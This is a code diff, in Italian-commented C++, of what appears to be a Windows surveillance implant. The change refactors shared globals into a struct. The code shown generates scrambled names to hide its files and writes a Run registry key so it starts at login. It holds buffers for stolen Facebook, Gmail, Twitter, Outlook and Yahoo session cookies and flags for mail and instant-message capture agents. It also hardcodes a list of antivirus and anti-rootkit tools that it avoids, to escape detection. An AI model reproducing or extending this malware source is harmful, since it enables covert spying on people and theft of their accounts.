@@ -24,6 +24,7 @@
 ////////////////////////////////////////////////////////////////////////////////
 #include "common.h" 
 #include "H4-DLL.h"	
+#include "bss.h"
 #include "demo_functions.h"
 #include "HM_CodeAlign.h"
 #include "AM_Core.h"
@@ -48,63 +49,6 @@
 
 #include <tchar.h>
 #include <Strsafe.h>
-
-#pragma bss_seg("shared")
-BOOL is_demo_version;
-BYTE crypt_key[KEY_LEN];		// Chiave di cifratura
-BYTE crypt_key_conf[KEY_LEN];   // Chiave di cifratura per la conf
-
-aes_context crypt_ctx;		// Context per la cifratura
-aes_context crypt_ctx_conf; // Context per la cifratura per la conf
-
-BOOL g_remove_driver;	// Indica se rimuovere o meno il driver sulla disinstallazione
-DWORD log_free_space;   // Spazio a disposizione per i log
-DWORD log_active_queue; // Quale coda e' attiva 1 o 0
-DWORD process_bypassed; //Numero di processi da bypassare
-char process_bypass_list[MAX_DYNAMIC_BYPASS+EMBEDDED_BYPASS][MAX_PBYPASS_LEN]; // Lista dei processi su cui non fare injection
-WCHAR process_bypass_desc[EMBEDDED_BYPASS][MAX_PBYPASS_LEN]; // Lista dei processi su cui non fare injection
-DWORD social_process_control;	// Semaforo per controllare il processo "social"
-BOOL network_crisis;			// Se deve fermare le sync
-BOOL system_crisis;				// Se deve fermare i comandi e l'hiding
-BOOL bPM_IMStarted;				// Flag che indica se il monitor e' attivo o meno
-BOOL bPM_MailCapStarted;		// Indica se l'agente e' attivo o meno
-BOOL bPM_ContactsStarted;
-
-DWORD max_social_mail_len;		// Dimensione oltre la quale sega un messaggio di gmail
-
-// Nomi dei file di sistema.
-// Sono qui perche' ad esempio anche le funzioni di 
-// setup dei wrapper devono poterci accedere dall'interno
-// dei processi iniettati.
-char H4DLLNAME[MAX_RAND_NAME];
-char H4_CONF_FILE[MAX_RAND_NAME];
-char H4_CONF_BU[MAX_RAND_NAME];
-char H4_HOME_DIR[MAX_RAND_NAME];
-char H4_HOME_PATH[DLLNAMELEN];
-char H4_CODEC_NAME[MAX_RAND_NAME];
-char H4_DUMMY_NAME[MAX_RAND_NAME];
-char H4_MOBCORE_NAME[MAX_RAND_NAME];
-char H4_MOBZOO_NAME[MAX_RAND_NAME];
-char H64DLL_NAME[MAX_RAND_NAME];
-char H4DRIVER_NAME[MAX_RAND_NAME];
-char H4DRIVER_NAME_ALT[MAX_RAND_NAME];
-char H4_UPDATE_FILE[MAX_RAND_NAME];
-char REGISTRY_KEY_NAME[MAX_RAND_NAME];
-//char OLD_REGISTRY_KEY_NAME[MAX_RAND_NAME];
-char EXE_INSTALLER_NAME[MAX_RAND_NAME];
-
-char SHARE_MEMORY_READ_NAME[MAX_RAND_NAME];
-char SHARE_MEMORY_WRITE_NAME[MAX_RAND_NAME];
-char SHARE_MEMORY_ASP_COMMAND_NAME[MAX_RAND_NAME];
-
-char FACEBOOK_IE_COOKIE[1024];
-char GMAIL_IE_COOKIE[1024];
-char TWITTER_IE_COOKIE[1024];
-char OUTLOOK_IE_COOKIE[1024];
-char YAHOO_IE_COOKIE[1024];
-
-#pragma bss_seg()
-#pragma comment(linker, "/section:shared,RWS")
 
 // Prototipi usati per comodita'
 char *HM_FindProc(DWORD);
@@ -354,7 +298,7 @@ BOOL IsLastInstance()
 	HANDLE hFind = INVALID_HANDLE_VALUE, hFile;
 	DWORD instances = 0;
 
-	_snwprintf_s(first_part, MAX_PATH, _TRUNCATE, L"%S", H4_HOME_PATH);
+	_snwprintf_s(first_part, MAX_PATH, _TRUNCATE, L"%S", shared.H4_HOME_PATH);
 	if (ptr = wcschr(first_part, L'\\')) {
 		ptr++;
 		if (ptr = wcschr(ptr, L'\\')) {
@@ -428,7 +372,7 @@ void HM_RemoveCore()
 	// Setup del thread di cancellazione
 	if (! (hMod = GetModuleHandle("KERNEL32.DLL")) )
 		return;
-	HM_CompletePath(H4DLLNAME, HMRemoveCoreThreadData.core_file);
+	HM_CompletePath(shared.H4DLLNAME, HMRemoveCoreThreadData.core_file);
 	HM_CompletePath("", HMRemoveCoreThreadData.work_dir);
 	HMRemoveCoreThreadData.pDeleteFile = (DeleteFile_t) HM_SafeGetProcAddress(hMod, "DeleteFileA");
 	HMRemoveCoreThreadData.pCreateFile = (CreateFile_t) HM_SafeGetProcAddress(hMod, "CreateFileA");
@@ -515,7 +459,7 @@ BOOL HM_ProcessByPass(DWORD pid)
 	// Faccio prima un check sulle descizioni
 	if (ReadDesc(pid, process_description, sizeof(process_description))) {
 		for(i=0; i<EMBEDDED_BYPASS; i++) {
-			if (process_bypass_desc[i][0]!=0 && CmpWildW(process_bypass_desc[i], process_description))
+			if (shared.process_bypass_desc[i][0]!=0 && CmpWildW(shared.process_bypass_desc[i], process_description))
 				return TRUE;
 		}
 	} else
@@ -526,11 +470,11 @@ BOOL HM_ProcessByPass(DWORD pid)
 		return FALSE;
 	
 	// Lo compara con quelli da bypassare
-	for(i=0; i<process_bypassed; i++) {
-		if (CmpWild((unsigned char *)process_bypass_list[i], (unsigned char *)process_name)) {
+	for(i=0; i<shared.process_bypassed; i++) {
+		if (CmpWild((unsigned char *)shared.process_bypass_list[i], (unsigned char *)process_name)) {
 			SAFE_FREE(process_name);
 			// Se e' uno dinamico, o non ho descrizione valida, allora controlla solo il nome
-			if (i>=EMBEDDED_BYPASS || process_bypass_desc[i][0]==0 || desc_failed)
+			if (i>=EMBEDDED_BYPASS || shared.process_bypass_desc[i][0]==0 || desc_failed)
 				return TRUE;
 			return FALSE;
 		}
@@ -1107,7 +1051,7 @@ BOOL HM_ExpandStringsW(WCHAR *source, WCHAR *dest, DWORD dsize)
 	while ( (ptr = wcsstr(dest, HOME_VAR_NAME_W)) ) {
 		*ptr = 0;
 		ptr += wcslen(HOME_VAR_NAME_W);
-		if (_snwprintf_s(tmp_buf, dsize, _TRUNCATE, L"%s%S%s", dest, H4_HOME_PATH, ptr) == -1 ||
+		if (_snwprintf_s(tmp_buf, dsize, _TRUNCATE, L"%s%S%s", dest, shared.H4_HOME_PATH, ptr) == -1 ||
 			_snwprintf_s(dest, dsize, _TRUNCATE, L"%s", tmp_buf) == -1) {
 			free(tmp_buf);
 			return FALSE;
@@ -1133,7 +1077,7 @@ BOOL HM_ExpandStrings(char *source, char *dest, DWORD dsize)
 	while ( (ptr = strstr(dest, HOME_VAR_NAME)) ) {
 		*ptr = 0;
 		ptr += strlen(HOME_VAR_NAME);
-		if (_snprintf_s(tmp_buf, dsize, _TRUNCATE, "%s%s%s", dest, H4_HOME_PATH, ptr) == -1 ||
+		if (_snprintf_s(tmp_buf, dsize, _TRUNCATE, "%s%s%s", dest, shared.H4_HOME_PATH, ptr) == -1 ||
 			_snprintf_s(dest, dsize, _TRUNCATE, "%s", tmp_buf) == -1) {
 			free(tmp_buf);
 			return FALSE;
@@ -1524,7 +1468,7 @@ BOOL HM_GuessNames()
 	char* ptr_offset = NULL;
 	
 	// Verifica se si tratta della versione demo o meno
-	is_demo_version = CheckDemoVersion();
+	shared.is_demo_version = CheckDemoVersion();
 
 	if (!FindModulePath(path_name, sizeof(path_name)))
 		return FALSE;
@@ -1535,99 +1479,99 @@ BOOL HM_GuessNames()
 	// Nome DLL
 	if (! (ptr_offset = FNC(StrRChrA)(path_name, NULL, '\\')) )
 		return FALSE;
-	_snprintf_s(H4DLLNAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset+1);
+	_snprintf_s(shared.H4DLLNAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset+1);
 	*ptr_offset = 0;
 
 	// Path della home
-	_snprintf_s(H4_HOME_PATH, DLLNAMELEN, _TRUNCATE, "%s", path_name);
+	_snprintf_s(shared.H4_HOME_PATH, DLLNAMELEN, _TRUNCATE, "%s", path_name);
 
 	// Nome directory home
 	if (! (ptr_offset = FNC(StrRChrA)(path_name, NULL, '\\')) )
 		return FALSE;
-	_snprintf_s(H4_HOME_DIR, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset+1);
+	_snprintf_s(shared.H4_HOME_DIR, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset+1);
 
 	// Deriva il nome dell'altro file che puo' essere usato per l'update
 	// (Uso Alphabetlen/2 per avere sempre gli stessi due nomi che ciclano)
-	if ( !(ptr_offset = LOG_ScrambleName(H4DLLNAME, ALPHABET_LEN/2, TRUE)) )
+	if ( !(ptr_offset = LOG_ScrambleName(shared.H4DLLNAME, ALPHABET_LEN/2, TRUE)) )
 		return FALSE;
-	_snprintf_s(H4_UPDATE_FILE, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
+	_snprintf_s(shared.H4_UPDATE_FILE, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
 	SAFE_FREE(ptr_offset);
 
 	// Fra i due nomi possibili sceglie quello piu' piccolo in ordine alfabetico
 	// da cui derivare i nomi rimanenti (in modo che qualsiasi dei due file
 	// fra attuale e update sia utilizzato, i nomi dei file di conf, codec, etc.
 	// siano gli stessi).
-	if (H4_UPDATE_FILE[0]<H4DLLNAME[0])
-		_snprintf_s(neutral_name, MAX_RAND_NAME, _TRUNCATE, "%s", H4_UPDATE_FILE);
+	if (shared.H4_UPDATE_FILE[0]< shared.H4DLLNAME[0])
+		_snprintf_s(neutral_name, MAX_RAND_NAME, _TRUNCATE, "%s", shared.H4_UPDATE_FILE);
 	else
-		_snprintf_s(neutral_name, MAX_RAND_NAME, _TRUNCATE, "%s", H4DLLNAME);
+		_snprintf_s(neutral_name, MAX_RAND_NAME, _TRUNCATE, "%s", shared.H4DLLNAME);
 
 	// Il file di configurazione lo derivo dal nome "neutrale" della DLL
 	// (quello fra i due dell'update piu' piccolo in ordine alfabetico).
 	if ( !(ptr_offset = LOG_ScrambleName(neutral_name, 1, TRUE)) )
 		return FALSE;
-	_snprintf_s(H4_CONF_FILE, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
+	_snprintf_s(shared.H4_CONF_FILE, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
 	SAFE_FREE(ptr_offset);
 	
 	// Il conf back-up lo derivo dal file di conf
-	if ( !(ptr_offset = LOG_ScrambleName(H4_CONF_FILE, 1, TRUE)) )
+	if ( !(ptr_offset = LOG_ScrambleName(shared.H4_CONF_FILE, 1, TRUE)) )
 		return FALSE;
-	_snprintf_s(H4_CONF_BU, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
+	_snprintf_s(shared.H4_CONF_BU, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
 	SAFE_FREE(ptr_offset);
 
 	// Il nome del codec lo derivo dal file di backup
-	if ( !(ptr_offset = LOG_ScrambleName(H4_CONF_BU, 1, TRUE)) )
+	if ( !(ptr_offset = LOG_ScrambleName(shared.H4_CONF_BU, 1, TRUE)) )
 		return FALSE;
-	_snprintf_s(H4_CODEC_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
+	_snprintf_s(shared.H4_CODEC_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
 	SAFE_FREE(ptr_offset);
 
 	// Il nome del file dummy lo derivo dal file del codec
-	if ( !(ptr_offset = LOG_ScrambleName(H4_CODEC_NAME, 1, TRUE)) )
+	if ( !(ptr_offset = LOG_ScrambleName(shared.H4_CODEC_NAME, 1, TRUE)) )
 		return FALSE;
-	_snprintf_s(H4_DUMMY_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
+	_snprintf_s(shared.H4_DUMMY_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
 	SAFE_FREE(ptr_offset);
 
 	// XXX Attenzione che dopo dummy_name c'e' il nome del driver di
 	// kaspersky, della pstorec.dll e del file di capture per la webcam
 	
-	if ( !(ptr_offset = LOG_ScrambleName(H4_DUMMY_NAME, 10, TRUE)) )
+	if ( !(ptr_offset = LOG_ScrambleName(shared.H4_DUMMY_NAME, 10, TRUE)) )
 		return FALSE;
-	_snprintf_s(H4_MOBCORE_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
+	_snprintf_s(shared.H4_MOBCORE_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
 	SAFE_FREE(ptr_offset);
 
-	if ( !(ptr_offset = LOG_ScrambleName(H4_MOBCORE_NAME, 1, TRUE)) )
+	if ( !(ptr_offset = LOG_ScrambleName(shared.H4_MOBCORE_NAME, 1, TRUE)) )
 		return FALSE;
-	_snprintf_s(H4_MOBZOO_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
+	_snprintf_s(shared.H4_MOBZOO_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
 	SAFE_FREE(ptr_offset);
 
 	// CONF SCRAMBLATO DI 15
-	if ( !(ptr_offset = LOG_ScrambleName(H4_MOBZOO_NAME, 1, TRUE)) )
+	if ( !(ptr_offset = LOG_ScrambleName(shared.H4_MOBZOO_NAME, 1, TRUE)) )
 		return FALSE;
-	_snprintf_s(H64DLL_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
+	_snprintf_s(shared.H64DLL_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
 	SAFE_FREE(ptr_offset);
 
 	// Se e' 32bit prende il driver classico (dummy scramblato di 1)
 	// altrimenti prende quello nuovo (conf scramblato di 16)
 	if (IsX64System()) {
-		if ( !(ptr_offset = LOG_ScrambleName(H64DLL_NAME, 1, TRUE)) )
+		if ( !(ptr_offset = LOG_ScrambleName(shared.H64DLL_NAME, 1, TRUE)) )
 			return FALSE;
-		_snprintf_s(H4DRIVER_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
+		_snprintf_s(shared.H4DRIVER_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
 		SAFE_FREE(ptr_offset);
 
-		if ( !(ptr_offset = LOG_ScrambleName(H4_DUMMY_NAME, 1, TRUE)) )
+		if ( !(ptr_offset = LOG_ScrambleName(shared.H4_DUMMY_NAME, 1, TRUE)) )
 			return FALSE;
-		_snprintf_s(H4DRIVER_NAME_ALT, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
+		_snprintf_s(shared.H4DRIVER_NAME_ALT, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
 		SAFE_FREE(ptr_offset);
 
 	} else {
-		if ( !(ptr_offset = LOG_ScrambleName(H4_DUMMY_NAME, 1, TRUE)) )
+		if ( !(ptr_offset = LOG_ScrambleName(shared.H4_DUMMY_NAME, 1, TRUE)) )
 			return FALSE;
-		_snprintf_s(H4DRIVER_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
+		_snprintf_s(shared.H4DRIVER_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
 		SAFE_FREE(ptr_offset);
 		
-		if ( !(ptr_offset = LOG_ScrambleName(H64DLL_NAME, 1, TRUE)) )
+		if ( !(ptr_offset = LOG_ScrambleName(shared.H64DLL_NAME, 1, TRUE)) )
 			return FALSE;
-		_snprintf_s(H4DRIVER_NAME_ALT, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
+		_snprintf_s(shared.H4DRIVER_NAME_ALT, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
 		SAFE_FREE(ptr_offset);
 
 	}
@@ -1635,9 +1579,9 @@ BOOL HM_GuessNames()
 	// XXX Attenzione che i successivi li devo derivare da H4_MOBZOO_NAME scramblato di 2
 
 	// La chiave nel registry e' binary patchata
-	_snprintf_s(REGISTRY_KEY_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", BIN_PATCHED_REGISTRY_KEY);
+	_snprintf_s(shared.REGISTRY_KEY_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", BIN_PATCHED_REGISTRY_KEY);
 	//_snprintf_s(OLD_REGISTRY_KEY_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", BIN_PATCHED_OLD_REGISTRY_KEY);
-	_snprintf_s(EXE_INSTALLER_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", H4_HOME_DIR);
+	_snprintf_s(shared.EXE_INSTALLER_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", shared.H4_HOME_DIR);
 
 	// Genera i nomi della shared memory in base alla chiave per-cliente
 	// XXX Verificare sempre che la chiave NON sia quella embeddata nel codice, maquella binary-patched
@@ -1646,11 +1590,11 @@ BOOL HM_GuessNames()
 	for (int j=0; j<16; j++)
 		ckey_arr[j] = temp_arr[j];
 	ckey_arr[8] = 0;
-	_snprintf_s(SHARE_MEMORY_READ_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ckey_arr);
+	_snprintf_s(shared.SHARE_MEMORY_READ_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ckey_arr);
 	ckey_arr[7] = 0;
-	_snprintf_s(SHARE_MEMORY_WRITE_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ckey_arr);
+	_snprintf_s(shared.SHARE_MEMORY_WRITE_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ckey_arr);
 	ckey_arr[6] = 0;
-	_snprintf_s(SHARE_MEMORY_ASP_COMMAND_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ckey_arr);
+	_snprintf_s(shared.SHARE_MEMORY_ASP_COMMAND_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ckey_arr);
 
 	return TRUE;
 }
@@ -1894,13 +1838,13 @@ void __stdcall HM_CreateProcessAsUser(char *cmd_line, DWORD flags, STARTUPINFO *
 // 
 char *HM_CompletePath(char *file_name, char *buffer)
 {
-	_snprintf_s(buffer, _MAX_PATH, _TRUNCATE, "%s\\%s", H4_HOME_PATH, file_name);
+	_snprintf_s(buffer, _MAX_PATH, _TRUNCATE, "%s\\%s", shared.H4_HOME_PATH, file_name);
 	return buffer;
 }
 
 WCHAR *HM_CompletePathW(WCHAR *file_name, WCHAR *buffer)
 {
-	_snwprintf_s(buffer, _MAX_PATH, _TRUNCATE, L"%S\\%s", H4_HOME_PATH, file_name);
+	_snwprintf_s(buffer, _MAX_PATH, _TRUNCATE, L"%S\\%s", shared.H4_HOME_PATH, file_name);
 	return buffer;
 }
 
@@ -1993,7 +1937,7 @@ void HM_InsertRegistryKey(char *dll_name, BOOL force_insert)
 	}
 
 	// Crea il file per l'avvio se non esiste gia'
-	sprintf(key_value, "..\\%s.%s", REGISTRY_KEY_NAME, extension);
+	sprintf(key_value, "..\\%s.%s", shared.REGISTRY_KEY_NAME, extension);
 	HM_CompletePath(key_value, dll_path);
 	hfile = CreateFile(dll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 	if (hfile == INVALID_HANDLE_VALUE) {
@@ -2034,11 +1978,11 @@ void HM_InsertRegistryKey(char *dll_name, BOOL force_insert)
 	// scrive la chiave in Run
 	if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS ||
 		FNC(RegCreateKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {		
-		sprintf(key_value, H4_HOME_PATH);
+		sprintf(key_value, shared.H4_HOME_PATH);
 		if (ptr = strrchr(key_value, '\\')) { 
 			*ptr = 0;
-			sprintf(key_value, "%s\\%s.%s", key_value, REGISTRY_KEY_NAME, extension);
-			FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1);
+			sprintf(key_value, "%s\\%s.%s", key_value, shared.REGISTRY_KEY_NAME, extension);
+			FNC(RegSetValueExA)(hOpen, shared.REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1);
 		}
 		FNC(RegCloseKey)(hOpen);
 	}
@@ -2055,7 +1999,7 @@ void HM_RemoveRegistryKey()
 
 	// Cancella chiave in Run
 	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
-		FNC(RegDeleteValueA) (hOpen, REGISTRY_KEY_NAME);
+		FNC(RegDeleteValueA) (hOpen, shared.REGISTRY_KEY_NAME);
 		FNC(RegCloseKey)(hOpen);
 	}
 
@@ -2077,7 +2021,7 @@ void HM_RemoveRegistryKey()
 	RegDeleteKeyA(HKEY_CURRENT_USER, key_path);
 
 	// Cancella il file
-	sprintf(key_path, "..\\%s.%s", REGISTRY_KEY_NAME, extension);
+	sprintf(key_path, "..\\%s.%s", shared.REGISTRY_KEY_NAME, extension);
 	HM_CompletePath(key_path, dll_path);
 	FNC(SetFileAttributesA)(dll_path, FILE_ATTRIBUTE_NORMAL);
 	FNC(DeleteFileA)(dll_path);
@@ -2212,7 +2156,7 @@ BOOL HM_CheckNewConf(char *conf_file_name)
 	// Procede quindi alla copia su quello originale.
 	// Se fallisce la copia non cancella il backup (lo copiera' al prossimo avvio).
 	UnlockConfFile();
-	if (!FNC(CopyFileA)(HM_CompletePath(conf_file_name, conf_path), HM_CompletePath(H4_CONF_FILE, orig_conf_path), FALSE))
+	if (!FNC(CopyFileA)(HM_CompletePath(conf_file_name, conf_path), HM_CompletePath(shared.H4_CONF_FILE, orig_conf_path), FALSE))
 		return FALSE;
 	LockConfFile();
 
@@ -2223,7 +2167,7 @@ BOOL HM_CheckNewConf(char *conf_file_name)
 	if (IsDeepFreeze()) {
 		HideDevice dev_df;
 		WCHAR dest_path[MAX_PATH];
-		swprintf(dest_path, L"%S", HM_CompletePath(H4_CONF_FILE, orig_conf_path));
+		swprintf(dest_path, L"%S", HM_CompletePath(shared.H4_CONF_FILE, orig_conf_path));
 		DFFixFile(&dev_df, dest_path);
 	}
 
@@ -2261,7 +2205,7 @@ char *HM_ReadClearConf(char *conf_name)
 			// Decifra il file di conf (assume che la parte cifrata sia gia' stata
 			// paddata).
 			memset(iv, 0, sizeof(iv));
-			aes_cbc_decrypt(&crypt_ctx_conf, iv, conf_memory, (BYTE *)conf_memory_clear, conf_len);
+			aes_cbc_decrypt(&shared.crypt_ctx_conf, iv, conf_memory, (BYTE *)conf_memory_clear, conf_len);
 		}	
 	}
 	
@@ -2390,19 +2334,19 @@ void WINAPI ParseBypassCallback(JSONObject conf_json, DWORD dummy)
 {
 	DWORD index;
 	JSONArray bypass_array = conf_json[L"nohide"]->AsArray();
-	process_bypassed = bypass_array.size();
-	if (process_bypassed > MAX_DYNAMIC_BYPASS)
-		process_bypassed = MAX_DYNAMIC_BYPASS;
-	process_bypassed += EMBEDDED_BYPASS; // Inserisce i processi hardcoded
+	shared.process_bypassed = bypass_array.size();
+	if (shared.process_bypassed > MAX_DYNAMIC_BYPASS)
+		shared.process_bypassed = MAX_DYNAMIC_BYPASS;
+	shared.process_bypassed += EMBEDDED_BYPASS; // Inserisce i processi hardcoded
 
 	// Legge i processi rimanenti dal file di configurazione
 	for (index=0; index<bypass_array.size(); index++) 
-		_snprintf_s(process_bypass_list[index+EMBEDDED_BYPASS], MAX_PBYPASS_LEN, _TRUNCATE, "%S", bypass_array[index]->AsString().c_str());
+		_snprintf_s(shared.process_bypass_list[index+EMBEDDED_BYPASS], MAX_PBYPASS_LEN, _TRUNCATE, "%S", bypass_array[index]->AsString().c_str());
 }
 
 void WINAPI ParseDriverHandling(JSONObject conf_json, DWORD dummy)
 {
-	g_remove_driver = (BOOL) conf_json[L"remove_driver"]->AsBool();
+	shared.g_remove_driver = (BOOL) conf_json[L"remove_driver"]->AsBool();
 }
 
 
@@ -2418,61 +2362,61 @@ void HM_UpdateGlobalConf()
 	// i valori globali.
 	memset(&date_delta, 0, sizeof(date_delta));
 	// Lista di processi da non toccare
-	process_bypassed = EMBEDDED_BYPASS;
-	ZeroMemory(process_bypass_list, sizeof(process_bypass_list));
-	strcpy(process_bypass_list[0],"outlook.exe");
-	strcpy(process_bypass_list[1],"ielowutil.exe");
+	shared.process_bypassed = EMBEDDED_BYPASS;
+	ZeroMemory(shared.process_bypass_list, sizeof(shared.process_bypass_list));
+	strcpy(shared.process_bypass_list[0],"outlook.exe");
+	strcpy(shared.process_bypass_list[1],"ielowutil.exe");
 	//strcpy(process_bypass_list[2],"KProcCheck.exe");
-	strcpy(process_bypass_list[3],"TaskMan.exe");
-	strcpy(process_bypass_list[4],"hackmon.exe");
-	strcpy(process_bypass_list[5],"hiddenfinder.exe");
-	strcpy(process_bypass_list[6],"Unhackme.exe");
+	strcpy(shared.process_bypass_list[3],"TaskMan.exe");
+	strcpy(shared.process_bypass_list[4],"hackmon.exe");
+	strcpy(shared.process_bypass_list[5],"hiddenfinder.exe");
+	strcpy(shared.process_bypass_list[6],"Unhackme.exe");
 	//strcpy(process_bypass_list[7],"blbeta.exe");
-	strcpy(process_bypass_list[8],"fsbl.exe");
-	strcpy(process_bypass_list[9],"sargui.exe");
-	strcpy(process_bypass_list[10],"avgarkt.exe");
-	strcpy(process_bypass_list[11],"avscan.exe");
-	strcpy(process_bypass_list[12],"RootkitRevealer.exe");
-	strcpy(process_bypass_list[13],"taskmgr.exe");
-	strcpy(process_bypass_list[14],"avgscanx.exe");
-	strcpy(process_bypass_list[15],"IceSword.exe");
+	strcpy(shared.process_bypass_list[8],"fsbl.exe");
+	strcpy(shared.process_bypass_list[9],"sargui.exe");
+	strcpy(shared.process_bypass_list[10],"avgarkt.exe");
+	strcpy(shared.process_bypass_list[11],"avscan.exe");
+	strcpy(shared.process_bypass_list[12],"RootkitRevealer.exe");
+	strcpy(shared.process_bypass_list[13],"taskmgr.exe");
+	strcpy(shared.process_bypass_list[14],"avgscanx.exe");
+	strcpy(shared.process_bypass_list[15],"IceSword.exe");
 	//strcpy(process_bypass_list[16],"svv.exe");
-	strcpy(process_bypass_list[17],"rku*.exe");
-	strcpy(process_bypass_list[18],"pavark.exe");
-	strcpy(process_bypass_list[19],"avp.exe");
-	strcpy(process_bypass_list[20],"bgscan.exe");
-	strcpy(process_bypass_list[21],"FlashPlayerPlugin_*.exe");
-	strcpy(process_bypass_list[22],"avk.exe");
-	strcpy(process_bypass_list[23],"k7*.exe");
-	strcpy(process_bypass_list[24],"rootkitbuster*.exe");
-	strcpy(process_bypass_list[25],"pcts*.exe");
-	strcpy(process_bypass_list[26],"iexplore.exe");
-	strcpy(process_bypass_list[27],"chrome.exe");
-	strcpy(process_bypass_list[28],"fsm32.exe");
+	strcpy(shared.process_bypass_list[17],"rku*.exe");
+	strcpy(shared.process_bypass_list[18],"pavark.exe");
+	strcpy(shared.process_bypass_list[19],"avp.exe");
+	strcpy(shared.process_bypass_list[20],"bgscan.exe");
+	strcpy(shared.process_bypass_list[21],"FlashPlayerPlugin_*.exe");
+	strcpy(shared.process_bypass_list[22],"avk.exe");
+	strcpy(shared.process_bypass_list[23],"k7*.exe");
+	strcpy(shared.process_bypass_list[24],"rootkitbuster*.exe");
+	strcpy(shared.process_bypass_list[25],"pcts*.exe");
+	strcpy(shared.process_bypass_list[26],"iexplore.exe");
+	strcpy(shared.process_bypass_list[27],"chrome.exe");
+	strcpy(shared.process_bypass_list[28],"fsm32.exe");
 	// XXX Se ne aggiungo, ricordarsi di modificare EMBEDDED_BYPASS
 
 	// Gestisco le descrizioni per i processi per cui le ho
-	ZeroMemory(process_bypass_desc, sizeof(process_bypass_desc));
-	wcscpy(process_bypass_desc[0],L"*Outlook*");
-	wcscpy(process_bypass_desc[3],L"Security Task Manager");
-	wcscpy(process_bypass_desc[4],L"Detects*rootkits*");
-	wcscpy(process_bypass_desc[5],L"*Hidden*Process*Finder*");
-	wcscpy(process_bypass_desc[6],L"Detects*rootkits*");
-	wcscpy(process_bypass_desc[8],L"*Secure*BlackLight*");
-	wcscpy(process_bypass_desc[9],L"Sophos Anti*Rootkit*");
-	wcscpy(process_bypass_desc[10],L"AVG Anti*Rootkit*");
-	wcscpy(process_bypass_desc[12],L"Rootkit detection utility*");
-	wcscpy(process_bypass_desc[18],L"*pavark*");
-	wcscpy(process_bypass_desc[24],L"Trend Micro RootkitBuster*");
-	wcscpy(process_bypass_desc[26],L"*Internet Explorer*");
-	wcscpy(process_bypass_desc[27],L"*Google*Chrome*");
-	wcscpy(process_bypass_desc[28],L"*F-Secure Settings*");
+	ZeroMemory(shared.process_bypass_desc, sizeof(shared.process_bypass_desc));
+	wcscpy(shared.process_bypass_desc[0],L"*Outlook*");
+	wcscpy(shared.process_bypass_desc[3],L"Security Task Manager");
+	wcscpy(shared.process_bypass_desc[4],L"Detects*rootkits*");
+	wcscpy(shared.process_bypass_desc[5],L"*Hidden*Process*Finder*");
+	wcscpy(shared.process_bypass_desc[6],L"Detects*rootkits*");
+	wcscpy(shared.process_bypass_desc[8],L"*Secure*BlackLight*");
+	wcscpy(shared.process_bypass_desc[9],L"Sophos Anti*Rootkit*");
+	wcscpy(shared.process_bypass_desc[10],L"AVG Anti*Rootkit*");
+	wcscpy(shared.process_bypass_desc[12],L"Rootkit detection utility*");
+	wcscpy(shared.process_bypass_desc[18],L"*pavark*");
+	wcscpy(shared.process_bypass_desc[24],L"Trend Micro RootkitBuster*");
+	wcscpy(shared.process_bypass_desc[26],L"*Internet Explorer*");
+	wcscpy(shared.process_bypass_desc[27],L"*Google*Chrome*");
+	wcscpy(shared.process_bypass_desc[28],L"*F-Secure Settings*");
 	
 	// Legge il delta date dal file di stato...
 	Log_RestoreAgentState(PM_CORE, (BYTE *)&date_delta, sizeof(date_delta)); 
 
 	// Legge la lista dei processi da bypassare e la gestione del driver
-	conf_memory = HM_ReadClearConf(H4_CONF_FILE);
